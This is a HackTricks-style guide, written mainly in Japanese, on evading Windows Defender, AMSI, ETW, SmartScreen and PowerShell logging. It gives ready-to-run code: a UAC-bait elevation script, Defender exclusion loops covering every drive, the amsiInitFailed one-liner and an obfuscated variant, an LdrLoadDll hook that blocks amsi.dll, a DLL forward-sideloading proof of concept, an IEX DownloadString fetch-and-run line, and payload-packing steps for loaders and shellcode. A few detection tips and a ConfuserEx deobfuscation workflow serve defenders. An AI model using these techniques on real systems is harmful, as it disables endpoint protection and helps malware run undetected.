# Antivirus (AV) Bypass

{{#include ../banners/hacktricks-training.md}}

**このページは** [**@m2rc_p**](https://twitter.com/m2rc_p)**が執筆しました!**

## Defender を停止

- [defendnot](https://github.com/es3n1n/defendnot): Windows Defender の動作を停止させるツール。
- [no-defender](https://github.com/es3n1n/no-defender): 別の AV を偽装して Windows Defender の動作を停止させるツール。
- [Disable Defender if you are admin](basic-powershell-for-pentesters/README.md)

### Defender を改変する前のインストーラー風 UAC ベイト

ゲームチートに扮した公開ロードは、未署名の Node.js/Nexe インストーラーとして配布されることが多く、まず**ユーザーに昇格を要求**し、その後で Defender を無効化します。フローは単純です:

1. `net session` で管理者コンテキストを確認します。コマンドは呼び出し元が管理者権限を持っている場合にのみ成功するため、失敗した場合はロードが標準ユーザーとして実行されていることを示します。
2. 元のコマンドラインを保持したまま、期待される UAC の同意プロンプトを発生させるために `RunAs` verb を使って即座に自身を再起動します。
```powershell
if (-not (net session 2>$null)) {
powershell -WindowStyle Hidden -Command "Start-Process cmd.exe -Verb RunAs -WindowStyle Hidden -ArgumentList '/c ""`<path_to_loader`>""'"
exit
}
```
被害者は既に「cracked」ソフトウェアをインストールしていると信じているため、プロンプトは通常承諾され、malwareがDefenderのポリシーを変更するために必要な権限が付与される。

### すべてのドライブ文字に対する包括的な `MpPreference` 除外

権限昇格後、GachiLoader-style chainsはサービスを完全に無効化する代わりにDefenderの盲点を最大化する。loaderはまずGUI watchdogを停止（`taskkill /F /IM SecHealthUI.exe`）し、その後**非常に広範な除外**を適用して、すべてのユーザープロファイル、システムディレクトリ、リムーバブルディスクをスキャン不能にする：
```powershell
$targets = @('C:\Users\', 'C:\ProgramData\', 'C:\Windows\')
Get-PSDrive -PSProvider FileSystem | ForEach-Object { $targets += $_.Root }
$targets | Sort-Object -Unique | ForEach-Object { Add-MpPreference -ExclusionPath $_ }
Add-MpPreference -ExclusionExtension '.sys'
```
Key observations:

- このループはすべてのマウントされたファイルシステム（D:\、E:\、USBスティック等）を走査するため、**ディスク上のどこにドロップされた将来のペイロードも無視される**。
- `.sys` 拡張子の除外は将来を見越したもので、攻撃者は Defender に再度触れることなく後で署名されていないドライバをロードする選択肢を残す。
- すべての変更は `HKLM\SOFTWARE\Microsoft\Windows Defender\Exclusions` に保存されるため、後続の段階で UAC を再発生させることなく除外が持続しているか確認したり、拡張したりできる。

Defender のサービスは停止されないため、単純なヘルスチェックは「antivirus active」と報告し続けるが、リアルタイム検査はこれらのパスに一切触れない。

## **AV 回避の方法論**

現在、AV はファイルが悪意あるかどうかを確認するために、static detection（静的検出）、dynamic analysis（動的分析）、そしてより高度な EDR では behavioural analysis（振る舞い分析）といった異なる手法を用いる。

### **Static detection**

Static detection は、バイナリやスクリプト内の既知の悪意ある文字列やバイト配列にフラグを立てること、そしてファイル自体から情報を抽出すること（例：file description、company name、digital signatures、icon、checksum 等）によって実現される。これは、既知のパブリックツールを使うと検出されやすくなることを意味する。これらの検出を回避する方法はいくつかある：

- **Encryption**

  バイナリを暗号化すれば AV がプログラムを検出する方法はなくなるが、メモリ上で復号して実行するためのローダーが必要になる。

- **Obfuscation**

  バイナリやスクリプト内の文字列をいくつか変更するだけで AV を通過できる場合もあるが、何を難読化するかによっては手間がかかる。

- **Custom tooling**

  独自ツールを開発すれば既知の悪性シグネチャは存在しないが、多大な時間と労力がかかる。

> [!TIP]
> Windows Defender の静的検出に対して確認する良い方法は [ThreatCheck](https://github.com/rasta-mouse/ThreatCheck) だ。ファイルを複数のセグメントに分割し、各セグメントを個別に Defender にスキャンさせることで、バイナリ内でどの文字列やバイトがフラグされているかを正確に教えてくれる。

実用的な AV 回避に関するこの [YouTube playlist](https://www.youtube.com/playlist?list=PLj05gPj8rk_pkb12mDe4PgYZ5qPxhGKGf) はぜひチェックすることを強く勧める。

### **Dynamic analysis**

Dynamic analysis は AV がバイナリをサンドボックス内で実行し、悪意のある活動（例：ブラウザのパスワードを復号して読む試行、LSASS のミニダンプ実行など）を監視することを指す。この部分はやや厄介だが、サンドボックスを回避するためにできることがいくつかある。

- **Sleep before execution** 実装次第では、実行前に長時間スリープすることは AV の動的分析を回避する優れた手段になり得る。AV はユーザーのワークフローを妨げないためにスキャン時間が非常に短いため、長いスリープは解析を妨げることがある。ただし、多くの AV のサンドボックスは実装によってスリープをスキップできる点が問題だ。
- **Checking machine's resources** 通常、サンドボックスは扱えるリソースが非常に限られている（例：< 2GB RAM）。さもなければユーザーのマシンを遅くしてしまうためだ。CPU の温度やファン速度を確認するなど、ここでは非常に創造的になれる。サンドボックスで実装されていないことも多い。
- **Machine-specific checks** 例えば、対象ユーザーのワークステーションが "contoso.local" ドメインに参加している場合、コンピュータのドメインをチェックして指定したものと一致するか確認し、一致しなければプログラムを終了させることができる。

Microsoft Defender のサンドボックスのコンピュータ名は HAL9TH であることが判明している。つまり、デトネーション前にマルウェア内でコンピュータ名をチェックし、名前が HAL9TH と一致すれば Defender のサンドボックス内にいることが分かるので、プログラムを終了させることができる。

<figure><img src="../images/image (209).png" alt=""><figcaption><p>出典: <a href="https://youtu.be/StSLxFbVz0M?t=1439">https://youtu.be/StSLxFbVz0M?t=1439</a></p></figcaption></figure>

サンドボックス対策に関する @mgeeky のその他の有用なヒント

<figure><img src="../images/image (248).png" alt=""><figcaption><p><a href="https://twitter.com/mariuszbit">@mgeeky</a> と <a href="https://discord.com/servers/red-team-vx-community-1012733841229746240">Red Team VX Discord</a> の #malware-dev チャンネル</p></figcaption></figure>

前述のとおり、この投稿では **public tools** はいずれ **検出される**。そこで自問すべきことがある：

例えば、LSASS をダンプしたい場合、**本当に mimikatz を使う必要があるのか**？あるいは LSASS をダンプする別の知名度の低いプロジェクトを使えないか？

正解はおそらく後者だ。mimikatz を例に取れば、プロジェクト自体は非常に優れているが、AV や EDR によって最もフラグされるソフトの一つであり、AV を回避するために扱うのは悪夢のような作業になる。したがって、達成したいことに対して代替手段を探すべきだ。

> [!TIP]
> ペイロードを回避用に変更する際は、Defender の **自動サンプル送信をオフにする**ことを必ず行い、長期的に回避を目指すのであれば、お願いだから **DO NOT UPLOAD TO VIRUSTOTAL**。特定の AV による検出を確認したい場合は、VM にその AV をインストールして自動サンプル送信をオフにし、満足するまでそこでテストすること。

## EXEs vs DLLs

可能な限り、回避には常に **DLL を使うことを優先する**べきだ。私の経験では、DLL ファイルは通常 **検出されにくく**、解析もされにくいため、（ペイロードが DLL として実行可能であれば）検出を回避するための非常に単純なトリックになる。

この画像から分かるように、Havoc の DLL ペイロードは antiscan.me で検出率が 4/26、EXE ペイロードは 7/26 だ。

<figure><img src="../images/image (1130).png" alt=""><figcaption><p>antiscan.me による通常の Havoc EXE ペイロードと通常の Havoc DLL の比較</p></figcaption></figure>

次に、DLL ファイルを使ってよりステルス性を高めるためのいくつかのトリックを示す。

## DLL Sideloading & Proxying

**DLL Sideloading** はローダーの DLL 検索順を利用し、被害アプリケーションと悪意あるペイロードを並べて配置することで成立する。

Siofra と以下の powershell スクリプトを使って、DLL Sideloading に脆弱なプログラムをチェックできる：
```bash
Get-ChildItem -Path "C:\Program Files\" -Filter *.exe -Recurse -File -Name| ForEach-Object {
$binarytoCheck = "C:\Program Files\" + $_
C:\Users\user\Desktop\Siofra64.exe --mode file-scan --enum-dependency --dll-hijack -f $binarytoCheck
}
```
このコマンドは "C:\Program Files\\" 内の DLL hijacking の影響を受けやすいプログラムと、それらがロードしようとする DLL ファイルの一覧を出力します。

私は、**DLL Hijackable/Sideloadable programs を自分で探索することを強くおすすめします**。この手法は正しく行えばかなりステルスですが、公に知られた DLL Sideloadable プログラムを使うと簡単に検知される可能性があります。

単にプログラムがロードを期待する名前の悪意ある DLL を配置するだけでは、プログラムがその DLL 内に特定の関数を期待しているため、必ずしも payload を実行できません。この問題を解決するために、**DLL Proxying/Forwarding** という別の手法を使います。

**DLL Proxying** は、プログラムがプロキシ（悪意ある）DLL に行う呼び出しを元の DLL に転送することで、プログラムの機能を維持しつつ payload の実行を扱えるようにします。

今回は [SharpDLLProxy](https://github.com/Flangvik/SharpDllProxy) プロジェクト（作者: [@flangvik](https://twitter.com/Flangvik/)）を使用します。

以下が私が行った手順です:
```
1. Find an application vulnerable to DLL Sideloading (siofra or using Process Hacker)
2. Generate some shellcode (I used Havoc C2)
3. (Optional) Encode your shellcode using Shikata Ga Nai (https://github.com/EgeBalci/sgn)
4. Use SharpDLLProxy to create the proxy dll (.\SharpDllProxy.exe --dll .\mimeTools.dll --payload .\demon.bin)
```
最後のコマンドは次の2つのファイルを生成します: DLL のソースコードテンプレートと、リネームされた元の DLL。

<figure><img src="../images/sharpdllproxy.gif" alt=""><figcaption></figcaption></figure>
```
5. Create a new visual studio project (C++ DLL), paste the code generated by SharpDLLProxy (Under output_dllname/dllname_pragma.c) and compile. Now you should have a proxy dll which will load the shellcode you've specified and also forward any calls to the original DLL.
```
<figure><img src="../images/dll_sideloading_demo.gif" alt=""><figcaption></figcaption></figure>

当方の shellcode（[SGN](https://github.com/EgeBalci/sgn) でエンコード）と proxy DLL は [antiscan.me](https://antiscan.me) で 0/26 の検出率でした！ 成功と言えるでしょう。

<figure><img src="../images/image (193).png" alt=""><figcaption></figcaption></figure>

> [!TIP]
> 私は DLL Sideloading に関する [S3cur3Th1sSh1t's twitch VOD](https://www.twitch.tv/videos/1644171543) を**強くおすすめします**。また、我々が議論した内容をより深く学ぶために [ippsec's video](https://www.youtube.com/watch?v=3eROsG_WNpE) も観てください。

### Forwarded Exports の悪用 (ForwardSideLoading)

Windows の PE モジュールは、実際には「forwarders」と呼ばれる関数をエクスポートできます。コードを指す代わりに、エクスポートエントリは `TargetDll.TargetFunc` の形式の ASCII 文字列を含みます。呼び出し元がエクスポートを解決すると、Windows ローダーは次のことを行います:

- `TargetDll` がまだロードされていない場合はロードする
- そこから `TargetFunc` を解決する

理解しておくべき主な挙動:
- `TargetDll` が KnownDLL の場合、保護された KnownDLLs 名前空間（例: ntdll, kernelbase, ole32）から提供される。
- `TargetDll` が KnownDLL でない場合は通常の DLL 検索順が使用され、forward を解決しているモジュールのディレクトリも含まれる。

これにより間接的な sideloading プリミティブが可能になります: 署名済み DLL の中から、エクスポートが non-KnownDLL モジュール名に forward されている関数を見つけ、その署名済み DLL を forward 先モジュールと同名の、攻撃者が制御する DLL と同じディレクトリに置きます。フォワードされたエクスポートが呼び出されると、ローダーはフォワードを解決して同じディレクトリからあなたの DLL をロードし、DllMain を実行します。

Windows 11 で観測された例:
```
keyiso.dll KeyIsoSetAuditingInterface -> NCRYPTPROV.SetAuditingInterface
```
`NCRYPTPROV.dll` は KnownDLL ではないため、通常の検索順で解決されます。

PoC (コピペ):
1) 署名済みのシステムDLLを書き込み可能なフォルダにコピーする
```
copy C:\Windows\System32\keyiso.dll C:\test\
```
同じフォルダに悪意のある `NCRYPTPROV.dll` を置く。最小限の DllMain でコード実行が可能で、DllMain をトリガーするためにフォワードされた関数を実装する必要はない。
```c
// x64: x86_64-w64-mingw32-gcc -shared -o NCRYPTPROV.dll ncryptprov.c
#include <windows.h>
BOOL WINAPI DllMain(HINSTANCE hinst, DWORD reason, LPVOID reserved){
if (reason == DLL_PROCESS_ATTACH){
HANDLE h = CreateFileA("C\\\\test\\\\DLLMain_64_DLL_PROCESS_ATTACH.txt", GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
if(h!=INVALID_HANDLE_VALUE){ const char *m = "hello"; DWORD w; WriteFile(h,m,5,&w,NULL); CloseHandle(h);}
}
return TRUE;
}
```
3) サイン済みの LOLBin でフォワードをトリガーする:
```
rundll32.exe C:\test\keyiso.dll, KeyIsoSetAuditingInterface
```
Observed behavior:
- rundll32（署名済み）はサイドバイサイドの `keyiso.dll`（署名済み）をロードする
- `KeyIsoSetAuditingInterface` を解決する際、ローダーはフォワード先の `NCRYPTPROV.SetAuditingInterface` をたどる
- その後ローダーは `C:\test` から `NCRYPTPROV.dll` をロードし、その `DllMain` を実行する
- もし `SetAuditingInterface` が実装されていない場合、`DllMain` 実行後にようやく "missing API" エラーが発生するだけになる

Hunting tips:
- ターゲットモジュールが KnownDLL でないフォワードされたエクスポートに注目する。KnownDLLs は `HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs` に列挙されている。
- 次のようなツールでフォワードされたエクスポートを列挙できる:
```
dumpbin /exports C:\Windows\System32\keyiso.dll
# forwarders appear with a forwarder string e.g., NCRYPTPROV.SetAuditingInterface
```
- 候補を探すには、Windows 11 forwarder インベントリを参照してください: https://hexacorn.com/d/apis_fwd.txt

検知/防御のアイデア:
- Monitor LOLBins（例: rundll32.exe）が非システムパスから署名済み DLL を読み込み、そのディレクトリから同じベース名の non-KnownDLLs を読み込む挙動を監視する
- ユーザー書き込み可能なパス下で、`rundll32.exe` → 非システムの `keyiso.dll` → `NCRYPTPROV.dll` のようなプロセス/モジュールチェーンをアラートする
- コード整合性ポリシー (WDAC/AppLocker) を適用し、アプリケーションディレクトリでの書き込み＋実行を拒否する

## [**Freeze**](https://github.com/optiv/Freeze)

`Freeze is a payload toolkit for bypassing EDRs using suspended processes, direct syscalls, and alternative execution methods`

Freeze を使用して shellcode をステルスにロードおよび実行できます。
```
Git clone the Freeze repo and build it (git clone https://github.com/optiv/Freeze.git && cd Freeze && go build Freeze.go)
1. Generate some shellcode, in this case I used Havoc C2.
2. ./Freeze -I demon.bin -encrypt -O demon.exe
3. Profit, no alerts from defender
```
<figure><img src="../images/freeze_demo_hacktricks.gif" alt=""><figcaption></figcaption></figure>

> [!TIP]
> Evasionはいたちごっこに過ぎません。今日有効な手法が明日検出される可能性があるため、単一のツールに頼らないでください。可能であれば複数の回避技術を組み合わせてください。

## AMSI (Anti-Malware Scan Interface)

AMSIは「[fileless malware](https://en.wikipedia.org/wiki/Fileless_malware)」を防ぐために作られました。当初、AVは**files on disk**のみをスキャンできたため、もしペイロードを**directly in-memory**で実行できれば、AVは十分な可視性がなく防ぐことができませんでした。

The AMSI feature is integrated into these components of Windows.

- User Account Control, or UAC (elevation of EXE, COM, MSI, or ActiveX installation)
- PowerShell (scripts, interactive use, and dynamic code evaluation)
- Windows Script Host (wscript.exe and cscript.exe)
- JavaScript and VBScript
- Office VBA macros

スクリプトの内容を暗号化・難読化されていない形で公開することで、ウイルス対策ソリューションがスクリプトの挙動を検査できるようにします。

Running `IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1')` will produce the following alert on Windows Defender.

<figure><img src="../images/image (1135).png" alt=""><figcaption></figcaption></figure>

amsi: を先頭に付け、その後にスクリプトが実行された実行ファイルのパス（この場合は powershell.exe）を付加していることに注目してください。

ファイルをディスクに配置していなくても、AMSIのためにin-memoryで検出されてしまいました。

Moreover, starting with **.NET 4.8**, C# code is run through AMSI as well. This even affects `Assembly.Load(byte[])` to load in-memory execution. Thats why using lower versions of .NET (like 4.7.2 or below) is recommended for in-memory execution if you want to evade AMSI.

さらに、**.NET 4.8**以降、C#コードもAMSIを通して実行されます。これは `Assembly.Load(byte[])` によるin-memory実行にも影響します。したがって、AMSIを回避してin-memory実行を行いたい場合は、4.7.2などのより低いバージョンの .NET を使用することが推奨されます。

There are a couple of ways to get around AMSI:

- **Obfuscation**

AMSIは主に静的検出で動作するため、ロードするスクリプトを変更することは検出回避の有効な方法になり得ます。

ただし、多層のobfuscationであってもAMSIはスクリプトを脱難読化できる可能性があるため、obfuscationのやり方によっては有効でないことがあります。そのため回避は単純ではありません。とはいえ、変数名をいくつか変更するだけで十分な場合もあるので、どれだけ検出されているかによります。

- **AMSI Bypass**

AMSIはDLLをpowershell（および cscript.exe、wscript.exe など）のプロセスにロードすることで実装されているため、権限のないユーザーとして実行していても簡単に改変することが可能です。このAMSI実装の欠陥により、研究者たちは複数のAMSI回避手法を見つけています。

**Forcing an Error**

AMSIの初期化を失敗させる（amsiInitFailed）と、当該プロセスではスキャンが開始されなくなります。これはもともと [Matt Graeber](https://twitter.com/mattifestation) によって公開され、Microsoftはその広範な利用を防ぐためのシグネチャを開発しました。
```bash
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
```
現在の powershell プロセスで AMSI を無効化するには、powershell の一行のコードで十分だった。この一行はもちろん AMSI 自体によって検知されるため、この手法を利用するには多少の修正が必要になる。

以下は、私がこの [Github Gist](https://gist.github.com/r00t-3xp10it/a0c6a368769eec3d3255d4814802b5db) から取ってきた修正済みの AMSI bypass です。
```bash
Try{#Ams1 bypass technic nº 2
$Xdatabase = 'Utils';$Homedrive = 'si'
$ComponentDeviceId = "N`onP" + "ubl`ic" -join ''
$DiskMgr = 'Syst+@.MÂ£nÂ£g' + 'e@+nt.Auto@' + 'Â£tion.A' -join ''
$fdx = '@ms' + 'Â£InÂ£' + 'tF@Â£' + 'l+d' -Join '';Start-Sleep -Milliseconds 300
$CleanUp = $DiskMgr.Replace('@','m').Replace('Â£','a').Replace('+','e')
$Rawdata = $fdx.Replace('@','a').Replace('Â£','i').Replace('+','e')
$SDcleanup = [Ref].Assembly.GetType(('{0}m{1}{2}' -f $CleanUp,$Homedrive,$Xdatabase))
$Spotfix = $SDcleanup.GetField($Rawdata,"$ComponentDeviceId,Static")
$Spotfix.SetValue($null,$true)
}Catch{Throw $_}
```
Keep in mind, that this will probably get flagged once this post comes out, so you should not publish any code if your plan is staying undetected.

**Memory Patching**

この手法は最初に [@RastaMouse](https://twitter.com/_RastaMouse/) によって発見され、amsi.dll 内の "AmsiScanBuffer" 関数（ユーザー提供の入力をスキャンする役割がある）のアドレスを特定し、E_INVALIDARG を返す命令で上書きします。こうすることで、実際のスキャンの結果は 0 を返し、それがクリーンな結果として解釈されます。

> [!TIP]
> 詳細な説明は [https://rastamouse.me/memory-patching-amsi-bypass/](https://rastamouse.me/memory-patching-amsi-bypass/) をお読みください。

There are also many other techniques used to bypass AMSI with powershell, check out [**this page**](basic-powershell-for-pentesters/index.html#amsi-bypass) and [**this repo**](https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell) to learn more about them.

### Blocking AMSI by preventing amsi.dll load (LdrLoadDll hook)

AMSI は現在のプロセスに `amsi.dll` がロードされた後にのみ初期化されます。言語に依存しない堅牢なバイパス方法は、ユーザーモードで `ntdll!LdrLoadDll` にフックを設置し、要求されたモジュールが `amsi.dll` の場合にエラーを返すことです。その結果、AMSI は決してロードされず、そのプロセスではスキャンは行われません。

実装概要（x64 C/C++ 疑似コード）:
```c
#include <windows.h>
#include <winternl.h>

typedef NTSTATUS (NTAPI *pLdrLoadDll)(PWSTR, ULONG, PUNICODE_STRING, PHANDLE);
static pLdrLoadDll realLdrLoadDll;

NTSTATUS NTAPI Hook_LdrLoadDll(PWSTR path, ULONG flags, PUNICODE_STRING module, PHANDLE handle){
if (module && module->Buffer){
UNICODE_STRING amsi; RtlInitUnicodeString(&amsi, L"amsi.dll");
if (RtlEqualUnicodeString(module, &amsi, TRUE)){
// Pretend the DLL cannot be found → AMSI never initialises in this process
return STATUS_DLL_NOT_FOUND; // 0xC0000135
}
}
return realLdrLoadDll(path, flags, module, handle);
}

void InstallHook(){
HMODULE ntdll = GetModuleHandleW(L"ntdll.dll");
realLdrLoadDll = (pLdrLoadDll)GetProcAddress(ntdll, "LdrLoadDll");
// Apply inline trampoline or IAT patching to redirect to Hook_LdrLoadDll
// e.g., Microsoft Detours / MinHook / custom 14‑byte jmp thunk
}
```
注意
- PowerShell、WScript/CScript、custom loaders などで動作します（AMSI をロードするあらゆるものに対して機能します）。
- 長いコマンドラインの痕跡を避けるために、スクリプトを stdin 経由（`PowerShell.exe -NoProfile -NonInteractive -Command -`）で渡すと組み合わせて使用してください。
- LOLBins 経由で実行される loaders によって使用されるのが確認されています（例: `regsvr32` が `DllRegisterServer` を呼び出す場合）。

このツール [https://github.com/Flangvik/AMSI.fail](https://github.com/Flangvik/AMSI.fail) は AMSI をバイパスするスクリプトも生成します。

**検出されたシグネチャの除去**

現在のプロセスのメモリから検出された AMSI シグネチャを削除するために、**[https://github.com/cobbr/PSAmsi](https://github.com/cobbr/PSAmsi)** や **[https://github.com/RythmStick/AMSITrigger](https://github.com/RythmStick/AMSITrigger)** のようなツールを使用できます。これらのツールは現在のプロセスのメモリをスキャンして AMSI シグネチャを探し、NOP 命令で上書きしてメモリから実質的に取り除きます。

**AMSI を使用する AV/EDR 製品**

AMSI を使用する AV/EDR 製品の一覧は **[https://github.com/subat0mik/whoamsi](https://github.com/subat0mik/whoamsi)** で確認できます。

**PowerShell version 2 を使う**
PowerShell version 2 を使用すると AMSI はロードされないため、スクリプトを AMSI によるスキャンなしで実行できます。次のように実行できます:
```bash
powershell.exe -version 2
```
## PS ロギング

PowerShell ロギングは、システム上で実行されたすべての PowerShell コマンドをログに記録できる機能です。監査やトラブルシューティングに役立ちますが、検出を回避しようとする攻撃者にとっては問題になることもあります。

PowerShell ロギングを回避するには、次のテクニックを使用できます:

- **Disable PowerShell Transcription and Module Logging**: この目的には [https://github.com/leechristensen/Random/blob/master/CSharp/DisablePSLogging.cs](https://github.com/leechristensen/Random/blob/master/CSharp/DisablePSLogging.cs) のようなツールを使用できます。
- **Use Powershell version 2**: PowerShell version 2 を使用すると AMSI はロードされないため、AMSI によるスキャンを受けずにスクリプトを実行できます。実行例: `powershell.exe -version 2`
- **Use an Unmanaged Powershell Session**: [https://github.com/leechristensen/UnmanagedPowerShell](https://github.com/leechristensen/UnmanagedPowerShell) を使って防御のない powershell を起動します（これは Cobal Strike の `powerpick` が使う方法です）。


## Obfuscation

> [!TIP]
> いくつかの難読化技術はデータを暗号化することに依存しており、結果としてバイナリのエントロピーが増加し、AV や EDR による検出が容易になる場合があります。これに注意し、暗号化は機密性の高いコードや隠す必要がある特定のセクションのみに適用することを検討してください。

### Deobfuscating ConfuserEx-Protected .NET Binaries

ConfuserEx 2（または商用フォーク）を使用するマルウェアを解析すると、デコンパイラやサンドボックスを阻害する複数の保護レイヤーに直面することがよくあります。以下のワークフローは、後で dnSpy や ILSpy などのツールで C# にデコンパイルできる、ほぼ元の IL を確実に復元します。

1.  Anti-tampering removal – ConfuserEx はすべての *method body* を暗号化し、それらを *module* の static コンストラクタ (`<Module>.cctor`) 内で復号します。これにより PE チェックサムもパッチされ、変更するとバイナリがクラッシュします。**AntiTamperKiller** を使って暗号化されたメタデータテーブルを特定し、XOR キーを回復してクリーンなアセンブリを書き換えます:
```bash
# https://github.com/wwh1004/AntiTamperKiller
python AntiTamperKiller.py Confused.exe Confused.clean.exe
```
出力には 6 つの anti-tamper パラメータ（`key0-key3`, `nameHash`, `internKey`）が含まれており、独自のアンパッカを作る際に役立ちます。

2.  Symbol / control-flow recovery – *clean* ファイルを **de4dot-cex**（de4dot の ConfuserEx 対応フォーク）に渡します。
```bash
de4dot-cex -p crx Confused.clean.exe -o Confused.de4dot.exe
```
Flags:
• `-p crx` – ConfuserEx 2 プロファイルを選択  
• de4dot は control-flow flattening を元に戻し、元の namespaces、classes、変数名を復元し、定数文字列を復号します。

3.  Proxy-call stripping – ConfuserEx は直接のメソッド呼び出しを軽量なラッパー（いわゆる *proxy calls*）に置き換えてデコンパイルをさらに困難にします。**ProxyCall-Remover** でそれらを除去します:
```bash
ProxyCall-Remover.exe Confused.de4dot.exe Confused.fixed.exe
```
このステップの後は、不透明なラッパー関数（`Class8.smethod_10` など）ではなく、`Convert.FromBase64String` や `AES.Create()` のような通常の .NET API が見られるはずです。

4.  Manual clean-up – 生成されたバイナリを dnSpy で実行して、大きな Base64 ブロブや `RijndaelManaged`/`TripleDESCryptoServiceProvider` の使用箇所を探し、*real* ペイロードを特定します。多くの場合、マルウェアは `<Module>.byte_0` 内で初期化された TLV エンコードされたバイト配列として格納しています。

上記のチェーンはマルウェアサンプルを実行することなく実行フローを復元するため、オフラインのワークステーションで作業する際に便利です。

> 🛈  ConfuserEx は `ConfusedByAttribute` というカスタム属性を生成します。これはサンプルの自動トリアージ用の IOC として利用できます。

#### ワンライナー
```bash
autotok.sh Confused.exe  # wrapper that performs the 3 steps above sequentially
```
---

- [**InvisibilityCloak**](https://github.com/h4wkst3r/InvisibilityCloak)**: C# obfuscator**
- [**Obfuscator-LLVM**](https://github.com/obfuscator-llvm/obfuscator): このプロジェクトの目的は、[LLVM](http://www.llvm.org/) コンパイルスイートのオープンソース fork を提供し、[code obfuscation](<http://en.wikipedia.org/wiki/Obfuscation_(software)>) と tamper-proofing を通じてソフトウェアのセキュリティを向上させることです。
- [**ADVobfuscator**](https://github.com/andrivet/ADVobfuscator): ADVobfuscator は、`C++11/14` 言語を使用して、コンパイル時に外部ツールを使わず、コンパイラを変更することなく obfuscated code を生成する方法を示します。
- [**obfy**](https://github.com/fritzone/obfy): C++ template metaprogramming framework によって生成される obfuscated operations のレイヤーを追加し、アプリケーションを解析しようとする者の作業を多少困難にします。
- [**Alcatraz**](https://github.com/weak1337/Alcatraz)**:** Alcatraz は .exe、.dll、.sys を含むさまざまな pe ファイルを obfuscate できる x64 binary obfuscator です。
- [**metame**](https://github.com/a0rtega/metame): Metame は arbitrary executables 向けのシンプルな metamorphic code engine です。
- [**ropfuscator**](https://github.com/ropfuscator/ropfuscator): ROPfuscator は ROP (return-oriented programming) を使用する、LLVM 対応言語向けの細粒度な code obfuscation framework です。ROPfuscator は通常の命令を ROP チェーンに変換することでアセンブリレベルでプログラムを obfuscate し、通常の制御フローの理解を阻害します。
- [**Nimcrypt**](https://github.com/icyguider/nimcrypt): Nimcrypt は Nim で書かれた .NET PE Crypter です
- [**inceptor**](https://github.com/klezVirus/inceptor)**:** Inceptor は既存の EXE/DLL を shellcode に変換してロードすることができます

## SmartScreen & MoTW

インターネットからいくつかの実行ファイルをダウンロードして実行するときに、この画面を見たことがあるかもしれません。

Microsoft Defender SmartScreen は、潜在的に悪意のあるアプリケーションの実行からエンドユーザを保護するためのセキュリティ機構です。

<figure><img src="../images/image (664).png" alt=""><figcaption></figcaption></figure>

SmartScreen は主にレピュテーションベースのアプローチで動作します。つまり、あまりダウンロードされていないアプリケーションは SmartScreen をトリガーし、ファイルの実行を警告・阻止します（ただし、More Info -> Run anyway をクリックすることで実行は可能です）。

**MoTW** (Mark of The Web) は Zone.Identifier という名前の [NTFS Alternate Data Stream](<https://en.wikipedia.org/wiki/NTFS#Alternate_data_stream_(ADS)>) で、インターネットからファイルをダウンロードした際に自動的に作成され、ダウンロード元の URL を格納します。

<figure><img src="../images/image (237).png" alt=""><figcaption><p>インターネットからダウンロードしたファイルの Zone.Identifier ADS を確認しているところ。</p></figcaption></figure>

> [!TIP]
> **信頼された**署名証明書で署名された実行ファイルは **SmartScreen をトリガーしない** ことに注意してください。

payload が Mark of The Web を付与されるのを防ぐ非常に有効な方法は、ISO のようなコンテナにパッケージングすることです。これは Mark-of-the-Web (MOTW) が **non NTFS** ボリュームには **適用できない** ためです。

<figure><img src="../images/image (640).png" alt=""><figcaption></figcaption></figure>

[**PackMyPayload**](https://github.com/mgeeky/PackMyPayload/) は、payload を出力コンテナにパッケージして Mark-of-the-Web を回避するツールです。

Example usage:
```bash
PS C:\Tools\PackMyPayload> python .\PackMyPayload.py .\TotallyLegitApp.exe container.iso

+      o     +              o   +      o     +              o
+             o     +           +             o     +         +
o  +           +        +           o  +           +          o
-_-^-^-^-^-^-^-^-^-^-^-^-^-^-^-^-^-_-_-_-_-_-_-_,------,      o
:: PACK MY PAYLOAD (1.1.0)       -_-_-_-_-_-_-|   /\_/\
for all your container cravings   -_-_-_-_-_-~|__( ^ .^)  +    +
-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-__-_-_-_-_-_-_-''  ''
+      o         o   +       o       +      o         o   +       o
+      o            +      o    ~   Mariusz Banach / mgeeky    o
o      ~     +           ~          <mb [at] binary-offensive.com>
o           +                         o           +           +

[.] Packaging input file to output .iso (iso)...
Burning file onto ISO:
Adding file: /TotallyLegitApp.exe

[+] Generated file written to (size: 3420160): container.iso
```
Here is a demo for bypassing SmartScreen by packaging payloads inside ISO files using [PackMyPayload](https://github.com/mgeeky/PackMyPayload/)

<figure><img src="../images/packmypayload_demo.gif" alt=""><figcaption></figcaption></figure>

## ETW

Event Tracing for Windows (ETW) は、アプリケーションやシステムコンポーネントが**イベントを記録する**ための強力なログ機構です。しかし、セキュリティ製品が悪意ある活動を監視・検出するために利用することもあります。

AMSI を無効化（バイパス）する方法と同様に、ユーザ空間プロセスの **`EtwEventWrite`** 関数をイベントを記録せずに即座に return させることも可能です。これは関数をメモリ上でパッチして即時 return させることで実現され、そのプロセスに対する ETW ロギングを事実上無効化します。

詳細は **[https://blog.xpnsec.com/hiding-your-dotnet-etw/](https://blog.xpnsec.com/hiding-your-dotnet-etw/) and [https://github.com/repnz/etw-providers-docs/](https://github.com/repnz/etw-providers-docs/)** を参照してください。


## C# Assembly Reflection

C# バイナリをメモリ上で読み込む手法は以前から知られており、AV に検出されずに post-exploitation ツールを実行する非常に有効な手段です。

ペイロードがディスクに触れず直接メモリにロードされるため、プロセス全体に対する AMSI のパッチだけを心配すれば良くなります。

ほとんどの C2 フレームワーク（sliver, Covenant, metasploit, CobaltStrike, Havoc など）は既に C# アセンブリをメモリ上で直接実行する機能を備えていますが、実行方法にはいくつかの違いがあります:

- **Fork\&Run**

新しい犠牲プロセスを**生成（spawn）**し、そのプロセスに post-exploitation の悪性コードを注入して実行し、終了したらそのプロセスを殺す手法です。利点と欠点があります。利点は実行が Beacon implant プロセスの**外部で行われる**ため、post-exploitation の動作で問題が起きても implant が生き残る可能性が高い点です。欠点は Behavioural Detections に捕捉される確率が高くなる点です。

